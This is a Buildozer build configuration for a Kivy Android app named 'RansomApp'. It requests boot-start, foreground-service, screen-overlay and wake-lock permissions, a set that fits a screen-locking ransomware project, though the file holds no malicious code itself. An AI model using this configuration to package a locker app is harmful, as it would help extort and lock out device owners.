[app]
title = RansomApp
package.name = ransomapp
package.domain = org.kivy
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0
requirements = python3,kivy,pyjnius,android
orientation = portrait
fullscreen = 1

[buildozer]
log_level = 2
warn_on_root = 1

[android]
android.api = 33
android.minapi = 21
android.ndk = 25b
android.arch = arm64-v8a
android.entrypoint = org.kivy.android.PythonActivity
android.permissions = RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICE, FOREGROUND_SERVICE_SPECIAL_USE, POST_NOTIFICATIONS, SYSTEM_ALERT_WINDOW, WAKE_LOCK
android.add_src = src/main/java/
android.manifest = src/main/AndroidManifest.xml
android.gradle_dependencies = androidx.core:core:1.12.0
p4a.branch = master
